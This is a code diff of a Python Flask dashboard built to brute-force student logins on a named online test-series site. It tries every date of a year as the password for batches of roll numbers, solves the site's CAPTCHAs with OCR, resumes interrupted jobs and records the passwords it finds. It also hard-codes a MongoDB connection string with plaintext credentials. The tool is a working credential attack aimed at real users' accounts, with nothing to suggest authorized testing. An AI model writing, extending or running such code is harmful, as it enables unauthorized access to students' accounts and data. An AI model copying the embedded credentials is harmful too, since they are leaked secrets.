@@ -1,24 +1,15 @@
 #!/usr/bin/env python3
 """
-Motion OTS Brute‑Force Dashboard – One‑by‑One with Delays
+Motion OTS Brute‑Force Dashboard – One‑by‑One with Delays & MongoDB Persistence
 Author: Potato
-
-This script brute‑forces the login on onlinetestseries.motion.ac.in
-by trying every date in a given year as the password (DD-MM-YYYY).
-It processes passwords sequentially with a configurable delay to avoid
-rate limiting and to be gentle on the server.
-
 Features:
+- MongoDB for persistent job state (auto‑resume on restart)
+- Batch processing: add multiple roll numbers at once
+- Each roll number gets its own job with separate logs
+- ddddocr CAPTCHA solver, configurable delays, retries
 - Flask web dashboard with live logs
-- SQLite database for job persistence
-- ddddocr CAPTCHA solver with fallback (Tesseract optional)
-- Configurable delay between attempts (default 2 seconds)
-- Progress tracking with live updates
-- Retry logic (up to 3 attempts per password with fresh CAPTCHAs)
 - Stop job functionality
-- Test endpoint for manual password verification
-
-Deployment: Ready for Render with Docker.
+- DELETE individual jobs and DELETE all jobs
 """
 
 import os
@@ -33,19 +24,27 @@ import aiohttp
 from bs4 import BeautifulSoup
 import re
 from datetime import datetime, timedelta
-import sqlite3
 import traceback
 from flask import Flask, render_template_string, request, jsonify, g
+
+# MongoDB
+import pymongo
+from pymongo import MongoClient, errors
 
 # ----------------------------------------------------------------------
 # CONFIGURATION
 # ----------------------------------------------------------------------
-DELAY_BETWEEN_ATTEMPTS = 2.0          # seconds (adjust to be slower/faster)
-MAX_RETRIES_PER_PASSWORD = 3          # number of times to retry with fresh CAPTCHA
-CONCURRENT_WORKERS = 1                # keep at 1 for strict one‑by‑one
-CAPTCHA_FETCH_TIMEOUT = 8             # seconds
-LOGIN_TIMEOUT = 12                    # seconds
-POLLING_INTERVAL = 1.5                # seconds for frontend updates
+DELAY_BETWEEN_ATTEMPTS = 2.0          # seconds
+MAX_RETRIES_PER_PASSWORD = 3
+CONCURRENT_WORKERS = 1
+CAPTCHA_FETCH_TIMEOUT = 8
+LOGIN_TIMEOUT = 12
+POLLING_INTERVAL = 1.5
+
+# MongoDB URI (replace with your own if needed)
+MONGO_URI = "mongodb+srv://Nischay999:Nischay999@cluster0.5kufo.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+DB_NAME = "brute_db"
+COLLECTION_NAME = "jobs"
 
 # ----------------------------------------------------------------------
 # OCR SETUP (ddddocr)
@@ -64,7 +63,7 @@ except Exception as e:
     print(f"❌ ddddocr initialization failed: {e}")
     sys.exit(1)
 
-# Optional Tesseract fallback (if installed)
+# Optional Tesseract fallback
 try:
     import pytesseract
     pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
@@ -73,20 +72,14 @@ except:
     TESSERACT_OK = False
 
 def solve_captcha_image(img_bytes, log_queue=None):
-    """
-    Solve CAPTCHA using ddddocr.
-    Returns the solved text (first 6 chars) or None on failure.
-    """
     try:
         result = ocr.classification(img_bytes)
         if result:
-            # Keep only uppercase letters and digits
             cleaned = re.sub(r'[^A-Z0-9]', '', result).strip()
             if len(cleaned) >= 4:
                 return cleaned[:6]
             if len(result) >= 4:
                 return result[:6]
-        # If ddddocr fails, try Tesseract fallback
         if TESSERACT_OK:
             from PIL import Image
             from io import BytesIO
@@ -105,128 +98,149 @@ def solve_captcha_image(img_bytes, log_queue=None):
         return None
 
 # ----------------------------------------------------------------------
-# DATABASE SETUP
+# MONGODB SETUP
 # ----------------------------------------------------------------------
-DATABASE = 'brute_jobs.db'
-
-def get_db():
-    db = getattr(g, '_database', None)
-    if db is None:
-        db = g._database = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
-    return db
-
-def init_db():
-    with sqlite3.connect(DATABASE) as conn:
-        conn.execute('''
-            CREATE TABLE IF NOT EXISTS jobs (
-                job_id TEXT PRIMARY KEY,
-                user_id TEXT NOT NULL,
-                year INTEGER NOT NULL,
-                status TEXT DEFAULT 'idle',
-                password TEXT,
-                logs TEXT DEFAULT '[]',
-                start_time TEXT,
-                end_time TEXT,
-                created_at TEXT DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
-        conn.commit()
+try:
+    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
+    mongo_client.server_info()
+    db = mongo_client[DB_NAME]
+    jobs_collection = db[COLLECTION_NAME]
+    print("✅ Connected to MongoDB")
+except Exception as e:
+    print(f"❌ MongoDB connection failed: {e}")
+    sys.exit(1)
 
 # ----------------------------------------------------------------------
-# JOB CLASS
+# JOB CLASS (with MongoDB persistence)
 # ----------------------------------------------------------------------
 class BruteJob:
     """
     A brute‑force job that runs in a background thread.
-    It processes one password at a time with delays.
+    Persists state in MongoDB so it can resume after a restart.
     """
 
-    def __init__(self, job_id, user_id, year, status='idle', password=None, logs=None):
+    def __init__(self, job_id, user_id, year, status='idle', password=None,
+                 logs=None, passwords_to_try=None, current_index=0,
+                 start_time=None, end_time=None, created_at=None):
         self.job_id = job_id
         self.user_id = user_id
         self.year = year
         self.status = status          # idle, running, success, failed, stopped
         self.password = password
         self.logs = logs if logs is not None else []
-        self.start_time = None
-        self.end_time = None
+        self.passwords_to_try = passwords_to_try if passwords_to_try is not None else []
+        self.current_index = current_index
+        self.start_time = start_time
+        self.end_time = end_time
+        self.created_at = created_at or datetime.utcnow().isoformat()
+
         self.thread = None
         self.stop_flag = False
         self.log_queue = queue.Queue()
-        self.total_passwords = 0
-        self.processed = 0
+        self.total_passwords = len(self.passwords_to_try)
 
     @classmethod
-    def from_db_row(cls, row):
+    def from_db_doc(cls, doc):
+        """Create a BruteJob from a MongoDB document."""
         job = cls(
-            row['job_id'],
-            row['user_id'],
-            row['year'],
-            row['status'],
-            row['password'],
-            json.loads(row['logs']) if row['logs'] else []
+            job_id=doc['job_id'],
+            user_id=doc['user_id'],
+            year=doc['year'],
+            status=doc.get('status', 'idle'),
+            password=doc.get('password'),
+            logs=doc.get('logs', []),
+            passwords_to_try=doc.get('passwords_to_try', []),
+            current_index=doc.get('current_index', 0),
+            start_time=doc.get('start_time'),
+            end_time=doc.get('end_time'),
+            created_at=doc.get('created_at')
         )
-        job.start_time = row.get('start_time')
-        job.end_time = row.get('end_time')
         return job
 
+    def to_db_doc(self):
+        """Convert job to a MongoDB document."""
+        return {
+            'job_id': self.job_id,
+            'user_id': self.user_id,
+            'year': self.year,
+            'status': self.status,
+            'password': self.password,
+            'logs': self.logs,
+            'passwords_to_try': self.passwords_to_try,
+            'current_index': self.current_index,
+            'start_time': self.start_time,
+            'end_time': self.end_time,
+            'created_at': self.created_at,
+        }
+
     def save_to_db(self):
-        with sqlite3.connect(DATABASE) as conn:
-            conn.execute('''
-                INSERT OR REPLACE INTO jobs
-                (job_id, user_id, year, status, password, logs, start_time, end_time)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (
-                self.job_id,
-                self.user_id,
-                self.year,
-                self.status,
-                self.password,
-                json.dumps(self.logs),
-                self.start_time,
-                self.end_time
-            ))
-            conn.commit()
+        """Save or update the job in MongoDB."""
+        try:
+            jobs_collection.update_one(
+                {'job_id': self.job_id},
+                {'$set': self.to_db_doc()},
+                upsert=True
+            )
+        except Exception as e:
+            print(f"Error saving job {self.job_id}: {e}")
+
+    @staticmethod
+    def load_from_db(job_id):
+        """Load a job from MongoDB by job_id."""
+        doc = jobs_collection.find_one({'job_id': job_id})
+        if doc:
+            return BruteJob.from_db_doc(doc)
+        return None
+
+    @staticmethod
+    def load_all_jobs():
+        """Load all jobs from MongoDB."""
+        docs = jobs_collection.find().sort('created_at', pymongo.DESCENDING)
+        return [BruteJob.from_db_doc(doc) for doc in docs]
 
     def start(self):
+        """Start the brute‑force thread if not already running."""
         if self.thread and self.thread.is_alive():
             return
         self.status = 'running'
-        self.start_time = datetime.now().isoformat()
-        self.logs = []
+        self.start_time = datetime.utcnow().isoformat()
         self.stop_flag = False
-        self.password = None
         self.save_to_db()
         self.thread = threading.Thread(target=self._run)
         self.thread.daemon = True
         self.thread.start()
 
     def _run(self):
+        """Entry point for the background thread."""
         try:
             asyncio.run(self._async_bruteforce())
         except Exception as e:
             self.log_queue.put(f"❌ Unhandled error: {traceback.format_exc()}")
         finally:
-            self.status = 'success' if self.password else 'failed'
-            self.end_time = datetime.now().isoformat()
+            if self.status != 'stopped':
+                self.status = 'success' if self.password else 'failed'
+            self.end_time = datetime.utcnow().isoformat()
             self.save_to_db()
 
     async def _async_bruteforce(self):
-        """
-        Main async loop: generate all dates in the year and process one by one.
-        """
+        """Main async loop: process passwords from current_index to end."""
         log_queue = self.log_queue
         user_id = self.user_id
         year = self.year
 
-        start_date = datetime(year, 1, 1)
-        end_date = datetime(year, 12, 31)
-        dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
-        self.total_passwords = len(dates)
-        self.processed = 0
-        log_queue.put_nowait(f"🚀 Starting brute‑force for {user_id} over {year} ({self.total_passwords} passwords)")
-        log_queue.put_nowait(f"⏱️  Delay between attempts: {DELAY_BETWEEN_ATTEMPTS}s, retries: {MAX_RETRIES_PER_PASSWORD}")
+        if not self.passwords_to_try:
+            start_date = datetime(year, 1, 1)
+            end_date = datetime(year, 12, 31)
+            dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
+            self.passwords_to_try = [d.strftime("%d-%m-%Y") for d in dates]
+            self.total_passwords = len(self.passwords_to_try)
+            self.save_to_db()
+            log_queue.put_nowait(f"🚀 Generated {self.total_passwords} passwords for {year}")
+
+        log_queue.put_nowait(f"🚀 Starting brute‑force for {user_id} over {year} (total: {self.total_passwords})")
+        log_queue.put_nowait(f"⏱️  Delay: {DELAY_BETWEEN_ATTEMPTS}s, retries: {MAX_RETRIES_PER_PASSWORD}")
+        if self.current_index > 0:
+            log_queue.put_nowait(f"⏩ Resuming from password {self.current_index+1}/{self.total_passwords}")
 
         connector = aiohttp.TCPConnector(limit=CONCURRENT_WORKERS, limit_per_host=CONCURRENT_WORKERS)
         timeout = aiohttp.ClientTimeout(total=20, connect=10)
@@ -236,15 +250,14 @@ class BruteJob:
             stop_event = asyncio.Event()
 
             tasks = []
-            for date in dates:
-                password = date.strftime("%d-%m-%Y")
+            for idx in range(self.current_index, self.total_passwords):
+                password = self.passwords_to_try[idx]
                 tasks.append(asyncio.create_task(
-                    self._worker(session, user_id, password, semaphore, result_queue, stop_event, log_queue)
+                    self._worker(session, user_id, password, semaphore, result_queue, stop_event, log_queue, idx)
                 ))
 
             found = None
             session_obj = None
-            # Wait for the first success or all tasks to finish
             while True:
                 try:
                     found, session_obj = await asyncio.wait_for(result_queue.get(), timeout=1.0)
@@ -255,7 +268,6 @@ class BruteJob:
                 if stop_event.is_set():
                     break
 
-            # Cancel remaining tasks
             for t in tasks:
                 t.cancel()
 
@@ -274,48 +286,40 @@ class BruteJob:
             else:
                 log_queue.put_nowait("❌ No password found in that year.")
 
-    async def _worker(self, session, user_id, password, semaphore, result_queue, stop_event, log_queue):
-        """
-        Worker for a single password. It tries up to MAX_RETRIES_PER_PASSWORD times
-        and then moves on to the next password.
-        """
+    async def _worker(self, session, user_id, password, semaphore, result_queue, stop_event, log_queue, idx):
         if stop_event.is_set():
             return
         async with semaphore:
-            # Update progress
-            self.processed += 1
-            progress_msg = f"Progress: {self.processed}/{self.total_passwords} ({self.processed/self.total_passwords*100:.1f}%)"
+            self.current_index = idx
+            progress_msg = f"Progress: {idx+1}/{self.total_passwords} ({(idx+1)/self.total_passwords*100:.1f}%)"
             log_queue.put_nowait(f"⏳ Attempting {password}  [{progress_msg}]")
 
             for attempt in range(MAX_RETRIES_PER_PASSWORD):
                 if stop_event.is_set():
                     return
                 try:
-                    # Step 1: Fetch and solve CAPTCHA
                     captcha = await self._fetch_captcha(session, log_queue)
                     if not captcha:
                         log_queue.put_nowait(f"⏭️  No CAPTCHA for {password} (attempt {attempt+1})")
                         continue
                     log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")
 
-                    # Step 2: Perform login
                     success, response = await self._try_login(session, user_id, password, captcha, log_queue)
                     if success:
                         log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
                         result_queue.put_nowait((password, session))
                         stop_event.set()
+                        self.current_index = idx + 1
+                        self.save_to_db()
                         return
 
-                    # Step 3: Check if we should retry
                     if response in ("captcha_error", "redirect_failure", "timeout"):
                         log_queue.put_nowait(f"🔄 Retry‑able ({response}) – attempt {attempt+1}/{MAX_RETRIES_PER_PASSWORD}")
-                        await asyncio.sleep(1.0)   # small delay before retry
+                        await asyncio.sleep(1.0)
                         continue
                     else:
-                        # Non‑retryable error – log it and give up
                         log_queue.put_nowait(f"❌ Login failed: {response[:120]}")
-                        break  # break out of retry loop
-
+                        break
                 except asyncio.TimeoutError:
                     log_queue.put_nowait(f"⏰ Timeout for {password}, retrying...")
                     await asyncio.sleep(1.0)
@@ -324,19 +328,15 @@ class BruteJob:
                     log_queue.put_nowait(f"❌ Worker error: {str(e)}")
                     break
 
-            # If we exhausted retries without success
+            self.current_index = idx + 1
+            self.save_to_db()
             log_queue.put_nowait(f"⏭️  Giving up on {password} after {MAX_RETRIES_PER_PASSWORD} attempts")
 
-            # Apply delay before next password (except if stopped)
             if not stop_event.is_set():
                 log_queue.put_nowait(f"⏱️  Waiting {DELAY_BETWEEN_ATTEMPTS}s before next attempt...")
                 await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)
 
     async def _fetch_captcha(self, session, log_queue):
-        """
-        Fetch a CAPTCHA image and solve it.
-        Returns the text or None.
-        """
         for attempt in range(3):
             try:
                 rand = int(time.time() * 1000) + attempt + os.getpid()
@@ -359,10 +359,6 @@ class BruteJob:
         return None
 
     async def _try_login(self, session, user_id, password, captcha, log_queue):
-        """
-        Attempt login with the given credentials and CAPTCHA.
-        Returns (success, message).
-        """
         data = {
             "login_username": user_id,
             "login_password": password,
@@ -388,7 +384,6 @@ class BruteJob:
                     if "dashboard/student-dashboard.php" in location:
                         return True, None
                     else:
-                        # Redirect to index.php – likely CAPTCHA error or wrong credentials
                         return False, "redirect_failure"
                 elif resp.status == 200:
                     text = await resp.text()
@@ -401,7 +396,6 @@ class BruteJob:
                         else:
                             return False, err_text[:100]
                     else:
-                        # No error div; check for dashboard indicators
                         if "dashboard" in text.lower() or "logout" in text.lower():
                             return True, None
                         return False, "unknown_failure"
@@ -418,22 +412,16 @@ class BruteJob:
         self.save_to_db()
 
     def get_updates(self):
-        """
-        Retrieve new log messages from the queue.
-        Returns a list of new messages and updates the job's logs.
-        """
         new_logs = []
         while not self.log_queue.empty():
             try:
                 msg = self.log_queue.get_nowait()
                 self.logs.append(msg)
                 new_logs.append(msg)
-                # If success message is detected, update status and password
                 if "SUCCESS" in msg or "Password found" in msg:
                     if "Password =" in msg:
                         self.password = msg.split("Password =")[-1].strip()
                     self.status = 'success'
-                # Save to DB periodically
                 if len(self.logs) % 5 == 0:
                     self.save_to_db()
             except:
@@ -448,23 +436,21 @@ class BruteJob:
 # ----------------------------------------------------------------------
 app = Flask(__name__)
 app.secret_key = 'supersecretkey-change-this-in-production'
-jobs = {}
+jobs = {}  # in‑memory cache of BruteJob objects
 
 def load_jobs_from_db():
-    with sqlite3.connect(DATABASE) as conn:
-        conn.row_factory = sqlite3.Row
-        rows = conn.execute("SELECT * FROM jobs ORDER BY created_at DESC").fetchall()
-        for row in rows:
-            job = BruteJob.from_db_row(row)
-            jobs[job.job_id] = job
-    print(f"📂 Loaded {len(jobs)} jobs from database.")
+    global jobs
+    job_list = BruteJob.load_all_jobs()
+    jobs = {job.job_id: job for job in job_list}
+    print(f"📂 Loaded {len(jobs)} jobs from MongoDB.")
+    for job_id, job in jobs.items():
+        if job.status == 'running':
+            print(f"🔄 Resuming job {job_id} for user {job.user_id}")
+            job.start()
 
 
 @app.route('/')
 def index():
-    """
-    Main dashboard page.
-    """
     HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -477,14 +463,17 @@ def index():
         .container { max-width: 1000px; margin: auto; }
         .card { background: #161b22; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
         h1 { color: #58a6ff; }
-        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
-        .form-group label { font-weight: bold; min-width: 80px; }
-        .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 150px; }
+        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: flex-start; }
+        .form-group label { font-weight: bold; min-width: 80px; padding-top: 8px; }
+        .form-group textarea, .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 200px; }
+        .form-group textarea { height: 100px; resize: vertical; }
         .btn { padding: 10px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
         .btn-start { background: #238636; color: #fff; }
         .btn-start:hover { background: #2ea043; }
         .btn-stop { background: #da3633; color: #fff; }
         .btn-stop:hover { background: #f85149; }
+        .btn-danger { background: #da3633; color: #fff; }
+        .btn-danger:hover { background: #f85149; }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .logs-box { background: #0d1117; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; white-space: pre-wrap; margin-top: 10px; }
         .log-entry { border-bottom: 1px solid #21262d; padding: 3px 0; }
@@ -502,18 +491,22 @@ def index():
         .job-status.idle { color: #8b949e; }
         .job-actions a { color: #58a6ff; margin-left: 10px; cursor: pointer; }
         .help-text { color: #8b949e; font-size: 0.9em; margin-top: 5px; }
+        .job-actions .delete { color: #f85149; }
+        .job-actions .delete:hover { text-decoration: underline; }
+        .btn-delete-all { background: #da3633; color: #fff; margin-left: 10px; }
+        .btn-delete-all:hover { background: #f85149; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="card">
         <h1>🚀 Motion OTS Brute‑Forcer</h1>
-        <p>Enter a user ID (roll number) and a year to test all dates as passwords.</p>
+        <p>Enter user IDs (one per line) and a year to test all dates as passwords.</p>
         <p class="help-text">⏱️  One password at a time with a delay between attempts to avoid rate‑limiting.</p>
         <form id="bruteForm">
             <div class="form-group">
-                <label for="user_id">User ID</label>
-                <input type="text" id="user_id" placeholder="e.g. 26173000005" required>
+                <label for="user_ids">User IDs</label>
+                <textarea id="user_ids" placeholder="e.g.&#10;26173000005&#10;26173000006" required></textarea>
             </div>
             <div class="form-group">
                 <label for="year">Year</label>
@@ -531,7 +524,9 @@ def index():
         <div id="logs" class="logs-box">Waiting for logs...</div>
     </div>
     <div class="card">
-        <h2>📋 Previous Jobs</h2>
+        <h2>📋 All Jobs
+            <button class="btn btn-delete-all" id="deleteAllBtn" onclick="deleteAllJobs()">Delete All</button>
+        </h2>
         <div id="jobList" class="job-list"></div>
     </div>
 </div>
@@ -547,16 +542,16 @@ def index():
 
     document.getElementById('bruteForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const user_id = document.getElementById('user_id').value.trim();
+        const user_ids = document.getElementById('user_ids').value.trim();
         const year = document.getElementById('year').value.trim();
-        if (!user_id || !year) return alert('Please fill all fields.');
+        if (!user_ids || !year) return alert('Please fill all fields.');
         startBtn.disabled = true;
         stopBtn.disabled = false;
         logsDiv.innerHTML = '';
         statusText.innerText = 'Starting...';
         passwordResult.innerText = '';
         const formData = new FormData();
-        formData.append('user_id', user_id);
+        formData.append('user_ids', user_ids);
         formData.append('year', year);
         try {
             const resp = await fetch('/start', { method: 'POST', body: formData });
@@ -566,8 +561,8 @@ def index():
                 resetUI();
                 return;
             }
-            jobId = data.job_id;
-            statusText.innerText = 'Running...';
+            jobId = data.job_ids[0];
+            statusText.innerText = `Started ${data.job_ids.length} job(s)`;
             if (pollInterval) clearInterval(pollInterval);
             pollInterval = setInterval(pollStatus, 1500);
             loadJobs();
@@ -658,9 +653,10 @@ def index():
                             ${j.password ? `🔑 ${j.password}` : ''}
                             <span style="font-size:0.8em;color:#8b949e;">${j.created_at}</span>
                         </div>
-                        <div>
+                        <div class="job-actions">
                             <a onclick="viewJob('${j.job_id}')">View Logs</a>
                             ${j.status === 'running' ? `<a onclick="stopJob('${j.job_id}')">Stop</a>` : ''}
+                            <a class="delete" onclick="deleteJob('${j.job_id}')">Delete</a>
                         </div>
                     </div>
                 `).join('');
@@ -675,6 +671,7 @@ def index():
             logsDiv.innerHTML = data.logs.map(msg => `<div class="log-entry">${msg}</div>`).join('');
             statusText.innerText = `Job ${jid} (${data.status})`;
             passwordResult.innerText = data.password ? `Password: ${data.password}` : '';
+            jobId = jid;
         }
     }
 
@@ -686,12 +683,52 @@ def index():
         } catch(err) { alert(err.message); }
     }
 
+    async function deleteJob(jid) {
+        if (!confirm(`Delete job ${jid}? This action cannot be undone.`)) return;
+        try {
+            const resp = await fetch(`/job/${jid}`, { method: 'DELETE' });
+            if (resp.ok) {
+                alert('Job deleted.');
+                if (jobId === jid) {
+                    resetUI();
+                    logsDiv.innerHTML = 'Job deleted.';
+                    statusText.innerText = 'Idle';
+                    passwordResult.innerText = '';
+                }
+                loadJobs();
+            } else {
+                const data = await resp.json();
+                alert('Error: ' + (data.error || 'Unknown'));
+            }
+        } catch(err) { alert(err.message); }
+    }
+
+    async function deleteAllJobs() {
+        if (!confirm('Delete ALL jobs? This action cannot be undone.')) return;
+        try {
+            const resp = await fetch('/jobs/all', { method: 'DELETE' });
+            if (resp.ok) {
+                alert('All jobs deleted.');
+                resetUI();
+                logsDiv.innerHTML = 'All jobs deleted.';
+                statusText.innerText = 'Idle';
+                passwordResult.innerText = '';
+                loadJobs();
+            } else {
+                const data = await resp.json();
+                alert('Error: ' + (data.error || 'Unknown'));
+            }
+        } catch(err) { alert(err.message); }
+    }
+
     function resetUI() {
         startBtn.disabled = false;
         stopBtn.disabled = true;
         if (pollInterval) clearInterval(pollInterval);
         jobId = null;
     }
+
+    // Load jobs on page load
     loadJobs();
 </script>
 </body>
@@ -702,31 +739,33 @@ def index():
 
 @app.route('/start', methods=['POST'])
 def start_job():
-    """
-    Start a new brute‑force job.
-    """
-    user_id = request.form.get('user_id')
-    year = request.form.get('year')
-    if not user_id or not year:
-        return jsonify({'error': 'Missing user_id or year'}), 400
+    user_ids_raw = request.form.get('user_ids')
+    year_str = request.form.get('year')
+    if not user_ids_raw or not year_str:
+        return jsonify({'error': 'Missing user_ids or year'}), 400
     try:
-        year = int(year)
+        year = int(year_str)
     except:
         return jsonify({'error': 'Year must be integer'}), 400
 
-    job_id = str(uuid.uuid4())
-    job = BruteJob(job_id, user_id, year)
-    jobs[job_id] = job
-    job.save_to_db()
-    job.start()
-    return jsonify({'job_id': job_id})
+    user_ids = [uid.strip() for uid in user_ids_raw.splitlines() if uid.strip()]
+    if not user_ids:
+        return jsonify({'error': 'No valid user IDs provided'}), 400
+
+    created_job_ids = []
+    for uid in user_ids:
+        job_id = str(uuid.uuid4())
+        job = BruteJob(job_id, uid, year)
+        job.save_to_db()
+        jobs[job_id] = job
+        job.start()
+        created_job_ids.append(job_id)
+
+    return jsonify({'job_ids': created_job_ids, 'count': len(created_job_ids)})
 
 
 @app.route('/status/<job_id>')
 def status(job_id):
-    """
-    Get the current status and new logs for a job.
-    """
     job = jobs.get(job_id)
     if not job:
         return jsonify({'error': 'Job not found'}), 404
@@ -741,9 +780,6 @@ def status(job_id):
 
 @app.route('/stop/<job_id>', methods=['POST'])
 def stop_job(job_id):
-    """
-    Stop a running job.
-    """
     job = jobs.get(job_id)
     if not job:
         return jsonify({'error': 'Job not found'}), 404
@@ -751,23 +787,54 @@ def stop_job(job_id):
     return jsonify({'status': 'stopped'})
 
 
+@app.route('/job/<job_id>', methods=['DELETE'])
+def delete_job(job_id):
+    """Delete a specific job from MongoDB and in-memory cache."""
+    job = jobs.get(job_id)
+    if job:
+        # If running, stop it first
+        if job.status == 'running':
+            job.stop()
+        # Remove from in-memory dict
+        del jobs[job_id]
+    # Delete from MongoDB
+    result = jobs_collection.delete_one({'job_id': job_id})
+    if result.deleted_count == 0:
+        return jsonify({'error': 'Job not found in database'}), 404
+    return jsonify({'message': 'Job deleted'})
+
+
+@app.route('/jobs/all', methods=['DELETE'])
+def delete_all_jobs():
+    """Delete all jobs from MongoDB and in-memory cache."""
+    # Stop all running jobs
+    for job_id, job in list(jobs.items()):
+        if job.status == 'running':
+            job.stop()
+    # Clear in-memory dict
+    jobs.clear()
+    # Delete all from MongoDB
+    result = jobs_collection.delete_many({})
+    return jsonify({'message': f'Deleted {result.deleted_count} jobs'})
+
+
 @app.route('/jobs')
 def list_jobs():
-    """
-    List all jobs from the database.
-    """
-    with sqlite3.connect(DATABASE) as conn:
-        conn.row_factory = sqlite3.Row
-        rows = conn.execute("SELECT job_id, user_id, year, status, password, created_at FROM jobs ORDER BY created_at DESC").fetchall()
-        return jsonify({'jobs': [dict(row) for row in rows]})
+    job_list = BruteJob.load_all_jobs()
+    return jsonify({'jobs': [
+        {
+            'job_id': j.job_id,
+            'user_id': j.user_id,
+            'year': j.year,
+            'status': j.status,
+            'password': j.password,
+            'created_at': j.created_at
+        } for j in job_list
+    ]})
 
 
 @app.route('/test-password', methods=['POST'])
 async def test_password():
-    """
-    Test a specific password manually and return the raw server response.
-    Expects JSON: {"user_id": "...", "password": "...", "captcha": "..."}
-    """
     data = request.get_json()
     if not data:
         return jsonify({'error': 'JSON body required'}), 400
@@ -779,7 +846,6 @@ async def test_password():
     if not user_id or not password:
         return jsonify({'error': 'user_id and password required'}), 400
 
-    # If CAPTCHA not provided, fetch one
     if not captcha:
         connector = aiohttp.TCPConnector(limit=1)
         timeout = aiohttp.ClientTimeout(total=10)
@@ -796,7 +862,6 @@ async def test_password():
             if not captcha:
                 return jsonify({'error': 'Could not fetch CAPTCHA'}), 400
 
-    # Perform login
     headers = {
         "User-Agent": "Mozilla/5.0",
         "Accept": "text/html",
@@ -833,24 +898,10 @@ async def test_password():
 
 
 # ----------------------------------------------------------------------
-# TEARDOWN
-# ----------------------------------------------------------------------
-@app.teardown_appcontext
-def close_db(exception):
-    db = getattr(g, '_database', None)
-    if db:
-        db.close()
-
-
-# ----------------------------------------------------------------------
 # STARTUP
 # ----------------------------------------------------------------------
 if __name__ == '__main__':
-    init_db()
     load_jobs_from_db()
-    # Run with debug=False for production
     app.run(debug=False, host='0.0.0.0', port=5000)
 else:
-    # For Gunicorn (production)
-    init_db()
     load_jobs_from_db()
